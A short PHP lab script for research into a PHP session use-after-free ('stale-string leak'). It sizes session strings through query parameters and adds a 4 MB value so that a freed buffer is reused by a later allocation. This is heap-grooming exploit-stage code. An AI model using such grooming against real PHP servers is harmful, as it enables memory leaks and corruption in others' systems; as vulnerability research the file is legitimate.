<?php
/* Lab-only arm variant for the stale-string leak research.
 *
 * The value of k1 is the R:2 target (data[1]) after the producer OOM. Its
 * length is tunable so its freed string buffer lands in a chosen Zend-MM
 * size class and can be reused by a later allocation (e.g. a HashTable).
 */
session_start();
$n0 = isset($_GET['n0']) ? max(1, (int)$_GET['n0']) : 2000;
$n1 = isset($_GET['n1']) ? max(1, (int)$_GET['n1']) : 2000;
$n2 = isset($_GET['n2']) ? max(1, (int)$_GET['n2']) : 2000;
$n3 = isset($_GET['n3']) ? max(1, (int)$_GET['n3']) : 2000;
$_SESSION = array();
$_SESSION['k0'] = str_repeat('K', $n0);
$_SESSION['k1'] = str_repeat('L', $n1);
$_SESSION['k2'] = str_repeat('M', $n2);
$_SESSION['k3'] = str_repeat('N', $n3);
$_SESSION['big'] = str_repeat('B', 4 * 1024 * 1024);
echo "LEAKVAR_OK\n";
